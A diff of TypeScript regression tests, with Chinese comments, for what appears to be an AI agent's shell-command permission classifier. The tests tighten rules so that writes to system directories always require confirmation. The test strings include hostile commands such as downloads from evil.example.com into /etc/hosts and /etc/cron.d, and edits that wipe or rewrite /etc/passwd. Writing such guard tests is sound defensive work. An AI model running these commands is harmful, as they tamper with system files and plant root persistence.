@@ -260,11 +260,13 @@ describe('classifyShellCommand — 关键漏洞回归护栏', () => {
     // 落盘到普通/非凭证敏感路径:至少升级到 prompt(不再静默放行)。
     for (const c of [
       'curl http://x/p > /Users/me/.bashrc',
-      'wget -O /etc/cron.d/x http://x/p',
       'curl http://x --output ~/.zshrc',
     ]) {
       expect(classifyShellCommand(c, roots)).toBe('prompt');
     }
+    // 落盘到**系统目录**:第三十八批起复用系统写红线 —— 往 /etc/cron.d 塞下载内容是 root 持久化,
+    // 不能交灰区 reviewer 静默 allow。
+    expect(classifyShellCommand('wget -O /etc/cron.d/x http://x/p', roots)).toBe('prompt-each-time');
     // 落盘到凭证目录(.ssh):凭证规则先行,进一步升级为 prompt-each-time(必问、不可记住)。
     expect(classifyShellCommand('curl http://x/p -o /Users/me/.ssh/authorized_keys', roots)).toBe('prompt-each-time');
   });
@@ -445,8 +447,9 @@ describe('classifyShellCommand — curl 凭证/隐藏参数 flag / rg --pre / wg
     expect(classifyShellCommand('rg --pre /bin/x pattern', roots)).toBe('prompt');
     expect(classifyShellCommand("rg --pre-glob '*.md' TODO", roots)).toBe('auto-approve');
   });
-  it('wget -P/--directory-prefix 写目录 → prompt', () => {
-    expect(classifyShellCommand('wget -P /etc --max-redirect=0 https://x.example', roots)).toBe('prompt');
+  it('wget -P/--directory-prefix 写目录 → prompt;落系统目录 → prompt-each-time', () => {
+    // /etc 是系统目录:第三十八批起下载落地复用系统写红线(此前只算灰区)。
+    expect(classifyShellCommand('wget -P /etc --max-redirect=0 https://x.example', roots)).toBe('prompt-each-time');
     expect(classifyShellCommand('wget --directory-prefix=/tmp --max-redirect=0 https://x.example', roots)).toBe('prompt');
   });
   it('组合重定向 &> / &>> → prompt', () => {
@@ -1798,6 +1801,60 @@ describe('target-directory / prlimit -o / 转义反引号 / 空 cwd(第三十六
     expect(reviewAction({ kind: 'exec', command: 'rm -rf build', cwd: '' }, roots)).toBe('prompt-each-time');
     // 确定性红线不因 cwd 未知而降级。
     expect(reviewAction({ kind: 'exec', command: 'sudo rm x', cwd: '' }, roots)).toBe('prompt-each-time');
+  });
+});
+
+describe('写通道全类扫面:truncate/原地编辑/解压落地/下载落盘(第三十八批评审)', () => {
+  it('以 FILE 操作数为写目标的命令写系统路径 → 必问', () => {
+    for (const c of [
+      'truncate -s 0 /etc/passwd',
+      'truncate -s 0 /System/Library/x',
+      'touch /etc/evil.conf',
+      'mkdir -p /etc/evilroot',
+      'rmdir /etc/somedir',
+    ]) {
+      expect(classifyShellCommand(c, roots), c).toBe('prompt-each-time');
+    }
+  });
+
+  it('sed/perl 的 -i 原地编辑系统文件 → 必问', () => {
+    for (const c of [
+      "sed -i 's/root/hack/' /etc/passwd",
+      'perl -pi -e "s/a/b/" /etc/hosts',
+    ]) {
+      expect(classifyShellCommand(c, roots), c).toBe('prompt-each-time');
+    }
+  });
+
+  it('解压/下载落地到系统目录 → 必问', () => {
+    for (const c of [
+      'tar -xzf payload.tgz -C /etc',
+      'unzip -d /etc payload.zip',
+      'curl -o /etc/hosts https://evil.example.com/h',
+      'curl --output-dir /etc -O https://evil.example.com/h',
+      'wget -O /etc/hosts https://evil.example.com/h',
+      'wget -P /etc https://evil.example.com/h',
+      'tar -C "C:\\Windows\\System32" -xf p.tar',
+    ]) {
+      expect(classifyShellCommand(c, roots), c).toBe('prompt-each-time');
+    }
+  });
+
+  it('同类命令写区内/临时目录不得被打断(扩面后的误报护栏)', () => {
+    for (const c of [
+      'truncate -s 0 logs/app.log', 'truncate -s 100M dist/blob.bin',
+      'touch src/a.ts', 'touch -r ref.ts src/b.ts', 'mkdir -p src/new/deep',
+      'mkdir -m 755 build', 'rmdir build/empty',
+      "sed -i '' 's/a/b/' src/x.ts", "sed -i 's/a/b/g' README.md",
+      'perl -pi -e "s/a/b/" src/x.ts', 'sed -n 1,5p src/x.ts',
+      'tar -xzf pkg.tgz -C dist', 'tar -C build -cf out.tar .', 'unzip -d dist pkg.zip',
+      'curl -sS -o dist/asset.js https://cdn.example.com/a.js',
+      'curl --output-dir dist -O https://cdn.example.com/a.js',
+      'wget -O dist/a.js https://cdn.example.com/a.js',
+      'wget -P dist https://cdn.example.com/a.js',
+    ]) {
+      expect(classifyShellCommand(c, roots), c).not.toBe('prompt-each-time');
+    }
   });
 });
 
